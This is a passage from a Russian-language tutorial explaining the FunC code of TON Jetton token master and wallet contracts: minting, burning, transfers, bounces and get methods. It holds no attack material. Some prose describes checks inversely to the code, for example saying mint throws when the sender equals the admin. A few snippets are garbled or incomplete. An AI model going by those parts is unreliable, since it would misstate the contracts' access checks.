    slice to_wallet_address = calculate_jetton_wallet_address(state_init);
    var msg = begin_cell()
    .store_uint(0x18, 6)
    .store_slice(to_wallet_address)
    .store_coins(amount)
    .store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
    .store_ref(state_init)
    .store_ref(master_msg);
    send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
}
```

#### [](#recv_internal-18)Разбираем recv\_internal()

Напомню, что у смарт-контрактов в сети TON есть два зарезервированных метода, к которым можно обращаться.

Первый, `recv_external()` эта функция выполняется когда запрос к контракту происходит из внешнего мира, то есть не из TON, например когда мы сами формируем сообщение и отправляем его через lite-client (Про установку [lite-client](https://docs.ton.org/participate/nodes/lite-client)).  
Второй, `recv_internal()` эта функция выполняется когда внутри самого TON, например когда какой-либо контракт обращается к нашему.

В нашем случае `recv_internal()` будет принимать следующие аргументы:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {

}
```

> `impure` — ключевое слово, которое указывает на то, что функция изменяет данные смарт-контракта. Например, мы должны указать `impure` спецификатор, если функция может изменять хранилище контрактов, отправлять сообщения или генерировать исключение, когда некоторые данные недействительны и функция предназначена для проверки этих данных. Важно: Если не указано impure и результат вызова функции не используется, то компилятор FunC может удалить этот вызов функции.

Теперь рассмотрим код этой функции. В самом начале идет проверка пустое ли сообщение.

```
if (in_msg_body.slice_empty?()) { ;; ignore empty messages
    return ();
}
```

Дальше мы начинаем разбирать(вычитывать) сообщение:

```
slice cs = in_msg_full.begin_parse();
```

Достаем флаги и проверяем что сообщение не было возвращенным (здесь имеется ввиду bounced).

```
if (flags & 1) { ;; ignore all bounced messages
    return ();
}
```

Достаем адрес отправителя сообщения на `recv_internal()`:

```
slice sender_address = cs~load_msg_addr();
```

Теперь на очереди `op` и `query_id` о них можно прочитать либо в гайдах по контрактам, либо в пятом уроке. Если кратко, то `op` идентификации операции далее.

```
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

Дальше воспользуемся вспомогательной функцией, которую мы писали ранее - `load_data()`.

```
(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
```

Теперь, используя условные операторов построим логику вокруг `op`. Для удобства коды хранятся в отельном файле `op-codes.fc`. А также в конце идет исключение, т.е если контракт не выполнит какое-то действие в соответствии с `op`, будет исключение.

> Важно: учитывая, что токен должен соответствовать стандарту, то для операций, которые описаны в стандарте, нужно брать соответствующие коды, например для `burn_notification()` это 0x7bdd97de.

Получаем:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();

	if (op == op::mint()) {
		;;здесь будет чеканка токенов
	}

	if (op == op::burn_notification()) {
		;;  здесь будет обработка сообщения от кошелька, что токены сгорели
	}

	if (op == 3) { ;; change admin
		;; здесь будет смена "админа" или как это еще можно назвать владельца контракта
	}

	if (op == 4) { ;; change content, delete this for immutable tokens
		;; здесь будет смена постоянных данных
	}

	throw(0xffff);
}
```

##### [](#opmint-19)op::mint()

Первое, что делаем при `op::mint()` это вызываем исключение если адрес администратора(владельца) контракта, равен адресу отправителя:

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));

}
```

Дальше достаем из тела сообщения адрес, на который надо отправить токены, кол-во TON для “транспортировки” токенов стандарта Jetton и сообщение мастер контракта.

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
	slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
}
```

Из сообщения мастер контракта достанем количество токенов, пропустив при этом `op` и `query_id`.

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
    slice master_msg_cs = master_msg.begin_parse();
    master_msg_cs~skip_bits(32 + 64); ;; op + query_id
    int jetton_amount = master_msg_cs~load_coins();
}
```

Вызываем функцию `mint_tokens()`, которую мы писали раньше, а также сохраняем постоянные данные, используя вспомогательную функцию `save_data()`. В конце завершим работу функции, оператор `return` нам в помощь. Получаем:

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
    slice master_msg_cs = master_msg.begin_parse();
    master_msg_cs~skip_bits(32 + 64); ;; op + query_id
    int jetton_amount = master_msg_cs~load_coins();
    mint_tokens(to_address, jetton_wallet_code, amount, master_msg);
    save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
    return ();
}
```

##### [](#opburn_notification-20)op::burn\_notification()

Первое, что делаем при `op::burn_notification()` это достаем из тела сообщения количество токенов и адрес, от которого пришла нотификация.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();

}
```

Далее, используя знакомый нам трюк по “воссозданию” адреса кошелька (функция `calculate_user_jetton_wallet_address()`), выдадим исключение если адрес отправителя (`sender_address`) не равен адресу кошелька.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );

}
```

Теперь сохраним постоянные данные, при этом уменьшим общее предложение токенов на сумму сожжённых токенов.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
	save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
}
```

После достанем адрес, на который надо вернуть ответ.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
	save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
	slice response_address = in_msg_body~load_msg_addr();
}
```

И если он не “нулевой” (не `addr_none`), отправляем сообщение с об излишке(`op::excesses()`) и конечно же завершим работу функции с помощью оператора `return`.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
    save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
    slice response_address = in_msg_body~load_msg_addr();
    if (response_address.preload_uint(2) != 0) {
      var msg = begin_cell()
        .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
        .store_slice(response_address)
        .store_coins(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_uint(op::excesses(), 32)
        .store_uint(query_id, 64);
      send_raw_message(msg.end_cell(), 2 + 64);
    }
    return ();
}
```

##### [](#op-3-op-4-21)op 3 и op 4

В примере мастер-контракта, также показаны две необязательные функциональности, а именно смена владельца(админа) мастер-контракта (`op == 3`), а также замена всего контента в постоянных данных (`op == 4`).

> Важно отметить, что прежде чем взаимодействовать с какими-либо контрактами, стоит изучить их код, так как часто разработчики оставляют лазейки, которые, например, могут полностью поменять всю логику работу контракта.

В каждом таком “управляющем данными контракта” `op` обязательно проверятся, что адрес отправителя — это адрес админа контракта. А далее данные просто сохранятся.

```
if (op == 3) { ;; change admin
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice new_admin_address = in_msg_body~load_msg_addr();
    save_data(total_supply, new_admin_address, content, jetton_wallet_code);
    return ();
}

if (op == 4) { ;; change content, delete this for immutable tokens
    throw_unless(73, equal_slices(sender_address, admin_address));
    save_data(total_supply, admin_address, in_msg_body~load_ref(), jetton_wallet_code);
    return ();
}
```

#### [](#get-22)Get методы

Итак, по стандарту Jetton мастер-контракт должен иметь два Get метода:

*   get\_jetton\_data() - который вернет данные о токене стандарта Jetton
*   get\_wallet\_address() - который возвращает по адресу, адрес смарт-контракта кошелька

##### [](#get_jetton_data-23)get\_jetton\_data()

Функция берет постоянные данные и возвращает:

*   total\_supply - (integer) - общее количество выпущенных жетонов
*   mintable - (-1/0) - флаг, указывающий, может ли количество жетонов увеличиваться
*   admin\_address - (MsgAddressInt) - адрес смарт-контракта, управляющего Jetton
*   jetton\_content - cell - данные в соответствии со стандартом [Token Data Standard](https://github.com/ton-blockchain/TIPs/issues/64)
*   jetton\_wallet\_code - cell - код кошелька для этого жетона

Код:

```
(int, int, slice, cell, cell) get_jetton_data() method_id {
	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
	return (total_supply, -1, admin_address, content, jetton_wallet_code);
}
```

##### [](#get_wallet_address-24)get\_wallet\_address()

C помощью вспомогательной функции “воспроизводим” адрес смарт-контракта кошелька.

Код:

```
slice get_wallet_address(slice owner_address) method_id {
	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
	return calculate_user_jetton_wallet_address(owner_address, my_address(), jetton_wallet_code);
}
```

## [](#jetton-walletfc-25)jetton-wallet.fc

Данный файл начинается с двух функций, которые мы определим, как низкоуровневый примитив TVM, с помощью ключевого слова `asm`.

```
int min_tons_for_storage() asm "10000000 PUSHINT"; ;; 0.01 TON
int gas_consumption() asm "10000000 PUSHINT"; ;; 0.01 TON
```

Обе функции понадобятся нам для того, чтобы проверять ограничения по газу и минимальному кол-ву TON.

> PUSHINT добавляет в стек Integer

##### [](#h-26)Загружаем и выгружаем постоянные данные

Теперь посмотрим на две вспомогательные функции, которые будут загружать и выгружать постоянные данные. В нашем “хранилище” мы будем хранить:

*   int balance - баланс токена
*   slice owner\_address - адрес владельца токенов
*   slice jetton\_master\_address - адрес мастер контракта для этого токена
*   cell jetton\_wallet\_code - код кошелька для этого жетона

Для того чтобы “достать” постоянные данные нам понадобятся две функции из стандартной библиотеки FunC

А именно: `get_data` - берет ячейку из постоянных данных. `begin_parse` - ячейку преобразует в slice

```
	(int, slice, slice, cell) load_data() inline {
	  slice ds = get_data().begin_parse();
	  return (ds~load_coins(), ds~load_msg_addr(), ds~load_msg_addr(), ds~load_ref());
	}
```

C помощью уже знакомым нам `load_` функциям выгрузим данные из slice и вернем их.

Чтобы сохранить данные, используется `set_data()` - она запишет ячейку в постоянные данные.

```
() save_data (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) impure inline {
  set_data(pack_jetton_wallet_data(balance, owner_address, jetton_master_address, jetton_wallet_code));
}
```

Саму же ячейку с данными мы соберем с помощью вспомогательной функции `pack_jetton_wallet_data()` из файла jetton-utils.fc.

Код фукнции `pack_jetton_wallet_data()`:

```
cell pack_jetton_wallet_data(int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) inline {
   return  begin_cell()
			.store_coins(balance)
			.store_slice(owner_address)
			.store_slice(jetton_master_address)
			.store_ref(jetton_wallet_code)
		   .end_cell();
}
```

`begin_cell()` - создаст Builder для будущей ячейки `store_` - запишут значения `end_cell()` - создаст Cell (ячейку)

##### [](#h-27)Функция отправки токенов (исходящий перевод)

Функция отправки токенов, проверяет условия в соответствии со [стандартом](https://github.com/ton-blockchain/TIPs/issues/74) и отправляет соответствующее сообщение.

```
() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
}
```

Пройдемся по коду функции. Код функции начинается с вычитывания данных из `in_msg_body`

```
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice to_owner_address = in_msg_body~load_msg_addr();
```

*   query\_id - произвольный номер запроса
*   int jetton\_amount - количество токенов
*   to\_owner\_address - адрес владельца, понадобится для воспроизвести адрес смарт-контракта

Дальше идет вызов фукнции `force_chain()` из файла params.fc.

```
force_chain(to_owner_address);
```

Функция `force_chain` проверяет, что адрес находится в воркчейне с номером 0 (базовый ворчейн). Подробнее про адреса и номера можно почитать [здесь](https://github.com/ton-blockchain/ton/blob/master/doc/LiteClient-HOWTO) в самом начале. Разберем код из params.fc:

```
int workchain() asm "0 PUSHINT";

() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

Вспомогательную функцию `workchain()` определим как низкоуровневый примитив TVM, с помощью ключевого слова `asm`. Integer == 0 понадобиться нам для сравнения.

```
int workchain() asm "0 PUSHINT";
```

Для извлечения необходимой нам информации из адреса, используется `parse_std_addr()`. `parse_std_addr()` - возвращает из `MsgAddressInt` воркчейн и 256-битный integer адрес.

```
() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

А для вызова исключения, если воркчейны не равны будем использовать `throw_unless()`.

Возвращаемся обратно в нашу функцию `send_tokens()`

Загрузим постоянные данные:

```
(int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
```

И сразу же вычтем из баланса, количество токенов (jetton\_amount), и сразу же проверим (выдадим исключения), что баланс не стал меньше нуля, и адреса не совпадают.

```
balance -= jetton_amount;
throw_unless(705, equal_slices(owner_address, sender_address));
throw_unless(706, balance >= 0);
```

Теперь используя уже знакомый нам трюк по мастер-контракту “воспроизводится” адрес кошелька:

```
  cell state_init = calculate_jetton_wallet_state_init(to_owner_address, jetton_master_address, jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);
```

Дальше достаем из тела сообщения достаем адрес на который необходимо будет отправить ответ, кастомную полезную нагрузку (возможно с токеном кто-то хочет передать еще какую-то информацию), а также количество наноТон, которое будет отправлено по адресу назначения.

```
  slice response_address = in_msg_body~load_msg_addr();
  cell custom_payload = in_msg_body~load_dict();
  int forward_ton_amount = in_msg_body~load_coins();
```

Теперь используя функцию `slice_bits`, которая возвращает количество битов данных в slice. Проверим, что в теле сообщения осталась только другая полезная нагрузка, и заодно ее и выгрущим.

```
  throw_unless(708, slice_bits(in_msg_body) >= 1);
  slice either_forward_payload = in_msg_body
```

Дальше собирается сообщение (напомню, что `to_wallet_address` это адрес смарт-контракта кошелька):

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(0)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init);
```

Тело сообщения собирается отдельно в соответствии со [стандартом](https://github.com/ton-blockchain/TIPs/issues/74). А именно:

> Отправка токенов относиться к transfer, поэтому тело собираем именно в соответствии с transfer

`op` - возьмем из файла jetton-utils.fc (по стандарту это internal\_transfer(), а значит 0x178d4519)  
`query_id` - произвольный номер запроса.  
`jetton amount` - количество переданных токенов в единицах этого жетона.  
`owner_address` - адрес нового владельца жетонов.  
`response_address` - адрес, куда отправить ответ с подтверждением успешного перевода и остальным входящим сообщением с Тон.  
`forward_ton_amount` - количество наноТон, которое необходимо отправить по адресу назначения.  
`forward_payload` - необязательные пользовательские данные, которые должны быть отправлены на адрес назначения.

Код тела сообщения и добавления его к сообщению:

```
  var msg_body = begin_cell()
	.store_uint(op::internal_transfer(), 32)
	.store_uint(query_id, 64)
	.store_coins(jetton_amount)
	.store_slice(owner_address)
	.store_slice(response_address)
	.store_coins(forward_ton_amount)
	.store_slice(either_forward_payload)
	.end_cell();
msg = msg.store_ref(msg_body);
```

> Внимательный читатель может спросить где `custom_payload`, но это поле необязательное.

И вроде все готово для отправки, но осталось два важных условия из стандарта, а именно:

*   недостаточно TON для обработки операции, развертывания Жетон-кошелька получателя и отправки forward\_ton\_amount.
*   После обработки запроса Жетон-кошелек получателя должен отправить не менее in\_msg\_value - forward\_amount - 2 \* max\_tx\_gas\_price на адрес response\_destination.

```
int fwd*count = forward_ton_amount ? 2 : 1;
throw_unless(709, msg_value >
forward_ton_amount +
;; 3 messages: wal1->wal2, wal2->owner, wal2->response
;; but last one is optional (it is ok if it fails)
fwd_count * fwd*fee +
(2 * gas_consumption() + min_tons_for_storage()));
;; universal message send fee calculation may be activated here
;; by using this instead of fwd_fee
;; msg_fwd_fee(to_wallet, msg_body, state_init, 15)
```

> Останавливаться подробно здесь не буду, так как комментарии и описание в стандарте токена дают подробную картину

Остается только отправить сообщение и сохранить постоянные данные:

```
  send_raw_message(msg.end_cell(), 64); ;; revert on errors
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
```

Итоговый код:

```
() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice to_owner_address = in_msg_body~load_msg_addr();
  force_chain(to_owner_address);
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  balance -= jetton_amount;

  throw_unless(705, equal_slices(owner_address, sender_address));
  throw_unless(706, balance >= 0);

  cell state_init = calculate_jetton_wallet_state_init(to_owner_address, jetton_master_address, jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);
  slice response_address = in_msg_body~load_msg_addr();
  cell custom_payload = in_msg_body~load_dict();
  int forward_ton_amount = in_msg_body~load_coins();
  throw_unless(708, slice_bits(in_msg_body) >= 1);
  slice either_forward_payload = in_msg_body;
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(0)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init);
  var msg_body = begin_cell()
	.store_uint(op::internal_transfer(), 32)
	.store_uint(query_id, 64)
	.store_coins(jetton_amount)
	.store_slice(owner_address)
	.store_slice(response_address)
	.store_coins(forward_ton_amount)
	.store_slice(either_forward_payload)
	.end_cell();

  msg = msg.store_ref(msg_body);
  int fwd_count = forward_ton_amount ? 2 : 1;
  throw_unless(709, msg_value >
					 forward_ton_amount +
					 ;; 3 messages: wal1->wal2,  wal2->owner, wal2->response
					 ;; but last one is optional (it is ok if it fails)
					 fwd_count * fwd_fee +
					 (2 * gas_consumption() + min_tons_for_storage()));
					 ;; universal message send fee calculation may be activated here
					 ;; by using this instead of fwd_fee
					 ;; msg_fwd_fee(to_wallet, msg_body, state_init, 15)

  send_raw_message(msg.end_cell(), 64); ;; revert on errors
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

##### [](#h-28)Функция получения токенов (входящий перевод)

Переходим к получению токенов:

```
() receive_tokens (slice in_msg_body, slice sender_address, int my_ton_balance, int fwd_fee, int msg_value) impure {

}
```

Функция `receive_tokens()` начинается с выгрузки постоянных данных, далее из тела сообщения достаем `query_id`, `jetton_amount`:

```
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
```

Так как кошелек получил токены, необходимо добавить их к балансу:

```
  balance += jetton_amount;
```

Продолжаем вычитывать данные из `in_msg_body`, берем два адреса: адрес от которого получили токены и адрес на который надо вернуть ответ.

```
  slice from_address = in_msg_body~load_msg_addr();
  slice response_address = in_msg_body~load_msg_addr();
```

Далле с помощью [бинарного оператора OR](https://en.wikipedia.org/wiki/Binary_operation) проверяем сразу два условия по адресам:

```
  throw_unless(707,
	  equal_slices(jetton_master_address, sender_address)
	  |
	  equal_slices(calculate_user_jetton_wallet_address(from_address, jetton_master_address, jetton_wallet_code), sender_address)
```

Также из тела сообщения достается `forward_ton_amount` - количество наноТон, которое будет отправлено по адресу назначения.

```
int forward_ton_amount = in_msg_body~load_coins();
```

И тут нам наконец-то понадобятся функции, который мы определяли в самом начале для ограничения по газу и минимальному кол-ву TON, а именно `min_tons_for_storage()` и `gas_consumption()`.

```
  int storage_fee = min_tons_for_storage() - min(ton_balance_before_msg, min_tons_for_storage());
  msg_value -= (storage_fee + gas_consumption());
```

Используя эти ограничения мы получаем значение для сообщения, которые мы будем использовать далее (отправим сообщение об излишке, если там много).

Далее если мы создаем сообщение с уведомлением о передаче:

```
  if(forward_ton_amount) {
	msg_value -= (forward_ton_amount + fwd_fee);
	slice either_forward_payload = in_msg_body;

	var msg_body = begin_cell()
		.store_uint(op::transfer_notification(), 32)
		.store_uint(query_id, 64)
		.store_coins(jetton_amount)
		.store_slice(from_address)
		.store_slice(either_forward_payload)
		.end_cell();

	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; we should not bounce here cause receiver can have uninitialized contract
	  .store_slice(owner_address)
	  .store_coins(forward_ton_amount)
	  .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_ref(msg_body);

	send_raw_message(msg.end_cell(), 1);
  }
```

> Важно заметить, что мы опять уменьшили `msg_value`, это понадобиться нам дальше, чтобы знать, надо ли отправить сообщение об излишке.

Теперь пришло время `msg_value`, из которого мы с упорством вычитали различные платежи (о них поподробнее можно прочитать [здесь](https://docs.ton.org/develop/smart-contracts/fees))

Проверяем, что адрес не нулевой и от `msg_value` что-то осталось и отправляем сообщение об излишке, с этим излишком соответственно.

```
  if ((response_address.preload_uint(2) != 0) & (msg_value > 0)) {
	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 010000
	  .store_slice(response_address)
	  .store_coins(msg_value)
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(op::excesses(), 32)
	  .store_uint(query_id, 64);
	send_raw_message(msg.end_cell(), 2);
  }
```

Ну и конечно же в самом конце идет сохранение данных.

```
save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
```

Итоговый код:

```
() receive_tokens (slice in_msg_body, slice sender_address, int my_ton_balance, int fwd_fee, int msg_value) impure {
  ;; NOTE we can not allow fails in action phase since in that case there will be
  ;; no bounce. Thus check and throw in computation phase.
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  balance += jetton_amount;
  slice from_address = in_msg_body~load_msg_addr();
  slice response_address = in_msg_body~load_msg_addr();
  throw_unless(707,
	  equal_slices(jetton_master_address, sender_address)
	  |
	  equal_slices(calculate_user_jetton_wallet_address(from_address, jetton_master_address, jetton_wallet_code), sender_address)
  );
  int forward_ton_amount = in_msg_body~load_coins();

  int ton_balance_before_msg = my_ton_balance - msg_value;
  int storage_fee = min_tons_for_storage() - min(ton_balance_before_msg, min_tons_for_storage());
  msg_value -= (storage_fee + gas_consumption());
  if(forward_ton_amount) {
	msg_value -= (forward_ton_amount + fwd_fee);
	slice either_forward_payload = in_msg_body;

	var msg_body = begin_cell()
		.store_uint(op::transfer_notification(), 32)
		.store_uint(query_id, 64)
		.store_coins(jetton_amount)
		.store_slice(from_address)
		.store_slice(either_forward_payload)
		.end_cell();

	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; we should not bounce here cause receiver can have uninitialized contract
	  .store_slice(owner_address)
	  .store_coins(forward_ton_amount)
	  .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_ref(msg_body);

	send_raw_message(msg.end_cell(), 1);
  }

  if ((response_address.preload_uint(2) != 0) & (msg_value > 0)) {
	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 010000
	  .store_slice(response_address)
	  .store_coins(msg_value)
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(op::excesses(), 32)
	  .store_uint(query_id, 64);
	send_raw_message(msg.end_cell(), 2);
  }

  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

##### [](#h-29)Функция сжигания токенов (входящий перевод)

Подробно разбирать функцию сжигания не будем, так как после прочтения разборов предыдущих функций, все должно быть понятно с первого взгляда.

Отмечу только логику работы - после уменьшения баланса токенов на выбранную сумму, отправляется сообщение в мастер контракт - уведомление о сжигании.

```
() burn_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
  ;; NOTE we can not allow fails in action phase since in that case there will be
  ;; no bounce. Thus check and throw in computation phase.
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice response_address = in_msg_body~load_msg_addr();
  ;; ignore custom payload
  ;; slice custom_payload = in_msg_body~load_dict();
  balance -= jetton_amount;
  throw_unless(705, equal_slices(owner_address, sender_address));
  throw_unless(706, balance >= 0);
  throw_unless(707, msg_value > fwd_fee + 2 * gas_consumption());

  var msg_body = begin_cell()
	  .store_uint(op::burn_notification(), 32)
	  .store_uint(query_id, 64)
	  .store_coins(jetton_amount)
	  .store_slice(owner_address)
	  .store_slice(response_address)
	  .end_cell();

  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(jetton_master_address)
	.store_coins(0)
	.store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_ref(msg_body);

  send_raw_message(msg.end_cell(), 64);

  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

#### [](#h-30)Отскок

Осталось написать еще одну функцию, прежде чем мы перейдем к `recv_internal()`. В функции `recv_internal()` нам предстоит обработать отскочившие сообщения. Подробнее про отскоки можно прочитать [в документации](https://docs.ton.org/develop/smart-contracts/guidelines/tips#about-bounce-ton-back).

При отскоке мы должны сделать следующее:

*   вернуть токены в баланс
*   выдать исключение если `op::internal_transfer()` или `op::burn_notification()`

В каркас функции будем передавать тело сообщения:

```
() on_bounce (slice in_msg_body) impure {

}
```

Берем `op` из тела и выдаем исключения если `op::internal_transfer()` или `op::burn_notification()`

```
() on_bounce (slice in_msg_body) impure {
  in_msg_body~skip_bits(32); ;; 0xFFFFFFFF
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int op = in_msg_body~load_uint(32);
  throw_unless(709, (op == op::internal_transfer()) | (op == op::burn_notification()));

}
```

Продолжая вычитывать данные из тела, возвращаем токены в баланс и сохраняем постоянные данные контракта.

```
() on_bounce (slice in_msg_body) impure {
  in_msg_body~skip_bits(32); ;; 0xFFFFFFFF
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int op = in_msg_body~load_uint(32);
  throw_unless(709, (op == op::internal_transfer()) | (op == op::burn_notification()));
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  balance += jetton_amount;
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

#### [](#recv_internal-31)recv\_internal()

Для того, чтобы наш кошелек мог принимать сообщения будем использовать внешний метод `recv_internal()`

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#h-32)Берем данные из тела сообщения

Итак, первое, что мы сделаем в `recv_internal()` это проверим пустое ли сообщение:

```
if (in_msg_body.slice_empty?()) { ;; ignore empty messages
    return ();
}
```

Далее достаем флаги и проверяем не является ли поступившее сообщение отскочившим. В случае если это отскок, воспользуемся функцией `on_bounce()`, которую мы написали ранее.

```
  slice cs = in_msg_full.begin_parse();
  int flags = cs~load_uint(4);
  if (flags & 1) {
	on_bounce(in_msg_body);
	return ();
  }
```

После продолжаем доставать данные (комментарии раскрывают, что это), включая `op`. Благодаря которому мы выстроим дальнейшую логику.

```
  slice sender_address = cs~load_msg_addr();
  cs~load_msg_addr(); ;; skip dst
  cs~load_coins(); ;; skip value
  cs~skip_bits(1); ;; skip extracurrency collection
  cs~load_coins(); ;; skip ihr_fee
  int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs

  int op = in_msg_body~load_uint(32);
```

Используя условные операторы выстраиваем логику вокруг `op` и используем написанные нами функции для реализации логики внутри.

```
  if (op == op::transfer()) { ;; outgoing transfer
	send_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  if (op == op::internal_transfer()) { ;; incoming transfer
	receive_tokens(in_msg_body, sender_address, my_balance, fwd_fee, msg_value);
	return ();
  }

  if (op == op::burn()) { ;; burn
	burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }
```

В конце идет исключение, т.е. если контракт не выполнит какое-то действие в соответствии с `op`, будет исключение. Итоговый код `recv_internal()`:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
  if (in_msg_body.slice_empty?()) { ;; ignore empty messages
	return ();
  }

  slice cs = in_msg_full.begin_parse();
  int flags = cs~load_uint(4);
  if (flags & 1) {
	on_bounce(in_msg_body);
	return ();
  }
  slice sender_address = cs~load_msg_addr();
  cs~load_msg_addr(); ;; skip dst
  cs~load_coins(); ;; skip value
  cs~skip_bits(1); ;; skip extracurrency collection
  cs~load_coins(); ;; skip ihr_fee
  int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs

  int op = in_msg_body~load_uint(32);

  if (op == op::transfer()) { ;; outgoing transfer
	send_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  if (op == op::internal_transfer()) { ;; incoming transfer
	receive_tokens(in_msg_body, sender_address, my_balance, fwd_fee, msg_value);
	return ();
  }

